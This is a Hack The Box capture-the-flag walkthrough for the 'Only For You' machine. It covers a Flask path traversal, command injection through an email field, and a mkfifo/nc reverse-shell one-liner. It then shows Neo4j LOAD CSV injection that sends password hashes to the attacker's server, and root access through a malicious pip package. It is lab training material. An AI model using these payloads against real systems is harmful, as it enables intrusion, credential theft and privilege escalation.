# HTB: Only For You Walkthrough

## Initial Scan

First, we will start with an `nmap` scan to check what services are available:

```
kali@kali:~$ nmap -sV 10.10.11.210 -p-
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-27 22:55 EDT
Nmap scan report for only4you.htb (10.10.11.210)
Host is up (0.077s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I see SSH and a webserver, not a lot to go on.

## Website Enumeration

Attempting to view `http://10.10.11.210` in the browser hits a redirect to `only4you.htb`

This indicates I should add a `/etc/hosts` entry to point the IP to that hostname:

```/etc/hosts
10.10.11.210    only4you.htb
```

After that, I am able to visit the website:

![htb_onlyforyou_website](https://guffre.github.io/assets/images/htb_onlyforyou_website.png)

I start up a default `dirb` scan and start looking at the website source

```
dirb http://only4you.htb
```

In the source, I find an element that indicates there is a subdomain to look at:

```
<div id="faq-list-3" class="collapse" data-bs-parent=".faq-list">
  <p>
   We have some beta products to test. You can check it <a href="http://beta.only4you.htb">here</a>
  </p>
</div>
```

I add this new subdomain to my `/etc/hosts` file, and then visit the new page. This gives me an option to download "source", which looks like its the source code for the `http://beta.only4you.htb` site.

## Website Directory Traversal

It's a flask app, so lets start looking for interesting things:

![htb_onlyforyou_flask](https://guffre.github.io/assets/images/htb_onlyforyou_flask.jpg)

 This looked the most promising to me:

```python
@app.route('/download', methods=['POST'])
def download():
    image = request.form['image']
    filename = posixpath.normpath(image) 
    if '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
    try:
        if not os.path.isfile(filename):
            flash('Image doesn\'t exist!', 'danger')
            return redirect('/list')
    except (TypeError, ValueError):
        raise BadRequest()
    return send_file(filename, as_attachment=True)
```

I used `curl` to send a POST with just a plain `/etc/passwd`, and it worked!

```
kali@kali:~$ curl -d "image=/etc/passwd" http://beta.only4you.htb/download
root:x:0:0:root:/root:/bin/bash
...
john:x:1000:1000:john:/home/john:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
neo4j:x:997:997::/var/lib/neo4j:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash
fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:996:996::/var/log/laurel:/bin/false
```

Let's recap real quick on what we know about the target:

1. nginx 1.18

2. OpenSSH 8.2

3. From pulling `/etc/os-release`: Ubuntu 20.04.6 LTS

Starting with nginx, we can look for the default website configurations:

```
kali@kali:~$ curl --output - http://beta.only4you.htb/download -d "image=/etc/nginx/sites-enabled/default"
server {
    listen 80;
    return 301 http://only4you.htb$request_uri;
}

server {
        listen 80;
        server_name only4you.htb;

        location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
        }
}

server {
        listen 80;
        server_name beta.only4you.htb;

        location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;
        }
}
```

From there, I make the assumption that if `beta.only4you.htb` is using Flask with an `app.py`, its likely that the main site has an `app.py` as well:

```
kali@kali:~$ curl --output - http://beta.only4you.htb/download -d "image=/var/www/only4you.htb/app.py"    
from flask import Flask, render_template, request, flash, redirect
from form import sendmessage
import uuid

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        subject = request.form['subject']
        message = request.form['message']
        ip = request.remote_addr

        status = sendmessage(email, subject, message, ip)
        if status == 0:
            flash('Something went wrong!', 'danger')
        elif status == 1:
            flash('You are not authorized!', 'danger')
        else:
            flash('Your message was successfuly sent! We will reply as soon as possible.', 'success')
        return redirect('/#contact')
    else:
        return render_template('index.html')

<snip>
```

This block is importing `sendmessage` from `form.py`, so let's look at this function to see if there is anything interesting.

Sure enough, there's this interesting chain:

```python
from subprocess import PIPE, run

def sendmessage(email, subject, message, ip):
        status = issecure(email, ip)


def issecure(email, ip):
        if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
                return 0
        else:
                domain = email.split("@", 1)[1]
                result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
```

## Command Injection

I put the above into a small script in order to test possible injects, and landed on this:

```
kali@kali:~/Downloads$ python3 test.py "a@a.co;ps -ef > mytmp"     
Domain:  a.co;ps -ef > mytmp
Command: dig txt a.co;ps -ef > mytmp
CompletedProcess(args=['dig txt a.co;ps -ef > mytmp'], returncode=0, stdout=b'\n; <<>> DiG 9.18.12-1-Debian <<>> txt a.co\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 51138\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 512\n;; QUESTION SECTION:\n;a.co.\t\t\t\tIN\tTXT\n\n;; ANSWER SECTION:\na.co.\t\t\t703\tIN\tTXT\t"v=spf1 -all"\n\n;; Query time: 40 msec\n;; SERVER: 9.9.9.9#53(9.9.9.9) (UDP)\n;; WHEN: Fri Apr 28 00:44:19 EDT 2023\n;; MSG SIZE  rcvd: 57\n\n')

kali@kali:~/Downloads$ ls -al mytmp
-rw-r--r-- 1 kali kali 21846 Apr 28 00:44 mytmp
```

Testing on the target was favorable, and it looks like I even spotted someone elses shell:

```
kali@kali:~$ curl --output - http://only4you.htb/ -d "name=a&email=a@a.co|ps -ef > mytmp&subject=a&message=a" && curl --output - http://beta.only4you.htb/download -d "image=/var/www/only4you.htb/mytmp" 
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/#contact">/#contact</a>. If not, click the link.
UID          PID    PPID  C STIME TTY          TIME CMD
www-data    1003       1  0 03:35 ?        00:00:00 /usr/bin/python3 /usr/bin/gunicorn --workers 3 --bind unix:beta.sock -m 007 app:app
www-data    1008       1  0 03:35 ?        00:00:00 /usr/bin/python3 /usr/bin/gunicorn --workers 3 --bind unix:only4you.sock -m 007 app:app
www-data    1026    1025  0 03:35 ?        00:00:00 nginx: worker process
www-data    1027    1025  0 03:35 ?        00:00:00 nginx: worker process
www-data    1070    1003  0 03:35 ?        00:00:00 /usr/bin/python3 /usr/bin/gunicorn --workers 3 --bind unix:beta.sock -m 007 app:app
www-data    1071    1003  0 03:35 ?        00:00:00 /usr/bin/python3 /usr/bin/gunicorn --workers 3 --bind unix:beta.sock -m 007 app:app
www-data    1073    1003  0 03:35 ?        00:00:00 /usr/bin/python3 /usr/bin/gunicorn --workers 3 --bind unix:beta.sock -m 007 app:app
www-data    1413       1  0 03:40 ?        00:00:00 bash -c bash -i >& /dev/tcp/10.10.16.49/443 0>&1
www-data    1414    1413  0 03:40 ?        00:00:00 bash -i
www-data    1427    1414  0 03:41 ?        00:00:00 script /dev/null -c bash
www-data    1428    1427  0 03:41 pts/0    00:00:00 sh -c bash
www-data    1429    1428  0 03:41 pts/0    00:00:00 bash
www-data    1431    1008  0 03:41 ?        00:00:00 /usr/bin/python3 /usr/bin/gunicorn --workers 3 --bind unix:only4you.sock -m 007 app:app
www-data    1485    1008  0 03:42 ?        00:00:00 /usr/bin/python3 /usr/bin/gunicorn --workers 3 --bind unix:only4you.sock -m 007 app:app
www-data    1501    1429  0 03:43 pts/0    00:00:00 ./chisel client 10.10.16.49:9999 R:3000:127.0.0.1:3000 R:8001:127.0.0.1:8001
www-data    1514    1008  0 03:44 ?        00:00:00 /usr/bin/python3 /usr/bin/gunicorn --workers 3 --bind unix:only4you.sock -m 007 app:app
www-data    4547    1485  0 04:41 ?        00:00:00 /bin/sh -c dig txt a.co|ps -ef > mytmp
www-data    4548    4547  0 04:41 ?        00:00:00 dig txt a.co
www-data    4549    4547  0 04:41 ?        00:00:00 ps -ef
```

## Initial Access

After some trial and error, I was successful getting a shell with the following command:

```
curl --output - http://only4you.htb/ -d "name=a&email=aa@aa.com;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i|nc 10.10.14.15 8000>/tmp/f;&subject=a&message=a"
```

This gave me a simple reverse shell onto the box. You can make it a little nicer using the `python` pty trick:

```
python3 -c "import pty;pty.spawn('/bin/bash')"
bash-5.0$ ls -al
ls -al
total 16
drwxr-xr-x  4 root     root     4096 Mar 30 11:51 .
drwxr-xr-x 13 root     root     4096 Mar 30 11:51 ..
drwxrwx---  6 www-data www-data 4096 Apr 28 03:35 beta.only4you.htb
drwxrwx---  5 www-data www-data 4096 Apr 28 04:31 only4you.htb
bash-5.0$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

After some poking around the box, it looks like there are a number of listening ports that are attached to localhost:

```
www-data@only4you:/tmp$ netstat -anopt
netstat -anopt
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name     Timer
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1035/nginx: worker   off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 10.10.11.210:80         10.10.16.9:37352        TIME_WAIT   -                    timewait (51.70/0/0)
tcp        0      1 10.10.11.210:38040      8.8.8.8:53              SYN_SENT    -                    on (7.10/3/0)
tcp        0      0 127.0.0.1:46802         127.0.0.1:3306          TIME_WAIT   -                    timewait (51.96/0/0)
tcp        0      0 127.0.0.1:46786         127.0.0.1:3306          TIME_WAIT   -                    timewait (50.95/0/0)
tcp        0    179 10.10.11.210:44936      10.10.14.15:8001        ESTABLISHED 1439/nc              on (0.27/0/0)
tcp6       0      0 127.0.0.1:7687          :::*                    LISTEN      -                    off (0.00/0/0)
tcp6       0      0 127.0.0.1:7474          :::*                    LISTEN      -                    off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      -                    off (0.00/0/0)
```

## Port Forward with SSF

I will use Secure Socket Funneling (SSF) to setup port forwards so that I can connect/scan these new ports. I moved SSF onto the box by using `python -m http.server` and `wget -r 10.10.14.15:8000`

```
./ssf -R 8001:127.0.0.1:8001 -R 3000:127.0.0.1:3000 10.10.14.15
```

Visiting port 8001, I found another website. I tried a few guesses, and was able to login with the credentials:

`admin:admin`

There, I found a complete form that sends a POST request to the "search" page. There was a lot of guesswork here, but the logic landed on the fact that there was a lot of Neo4j on the server, so lets try some neo4j injects.

![htb_onlyforyou_internal](https://guffre.github.io/assets/images/htb_onlyforyou_internal.jpg)

## Neo4j SQL Injection

It took a lot of trial and error, but eventually I found this site that details neo4j injection: [Case Study - Neo4j Injection // MeowMeowAttack&#39;s security.log](https://meowmeowattack.github.io/case-study/neo4j-injection/)

```
' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name LOAD CSV FROM 'http://10.10.14.15/?name=' + name as l RETURN 0 as _0 //
```

Result:

```
kali@kali:~$ sudo nc -v -l -p 80
listening on [any] 80 ...
connect to [10.10.14.15] from only4you.htb [10.10.11.210] 46018
GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1
User-Agent: NeoLoadCSV_Java/17.0.6+10-Ubuntu-0ubuntu120.04.1
Host: 10.10.14.15
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
```

So we have the neo4j information and an inject that works!

The next attack described on the page is:

```
> ' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.15/' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```

Which gives us some password hashes:

```
kali@kali:~/Downloads/ssf64$ sudo python -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.210 - - [28/Apr/2023 13:36:12] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [28/Apr/2023 13:36:12] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [28/Apr/2023 13:36:12] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [28/Apr/2023 13:36:12] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [28/Apr/2023 13:36:13] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [28/Apr/2023 13:36:13] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [28/Apr/2023 13:36:13] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [28/Apr/2023 13:36:13] "GET /?username=john HTTP/1.1" 200 -
```

And cracking those with john (after specifying that they were Raw-SHA256 hashes):

![htb_onlyforyou_hashes](https://guffre.github.io/assets/images/htb_onlyforyou_hashes.jpg)

## User Access and Root Priv-esc

Now that we have user access, one of the first things I check is sudo privileges:

```
john@only4you:~$ sudo -l
Matching Defaults entries for john on only4you:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
```

Testing our access against the 127.0.0.1 service, we find that there is a repository with a .tar.gz already inside it!

![htb_onlyforyou_repo](https://guffre.github.io/assets/images/htb_onlyforyou_repo.png)

Downloading and taking a look at this `x.tar.gz` it is apparent that it is a pip exploit: [GitHub - wunderwuzzi23/this_is_fine_wuzzi: Demo of a malicious python package that will run code upon pip download or install](https://github.com/wunderwuzzi23/this_is_fine_wuzzi)

I am not sure if this was put by a person, but I will take that .tar.gz and use it to read the root flag. I just need to set up a public git repo, and then use `sudo pip3` to download it.

First, I created the repo in the GUI. Then in the command line I used the following commands:

```
git init
git add .
git commit -m "x"
git remote add origin http://127.0.0.1:3000/john/tmp.git
git push -u origin master

sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/tmp/raw/master/sh.tar.gz
```

My wuzzi payload was as follows:

```
def RunCommand():
    print(os.system('ls -al /root/*'))
    os.system("cat /root/*txt > /var/tmp/f")
```

I did not see the `print()` output, but I did get the `f` file created with the root flag!
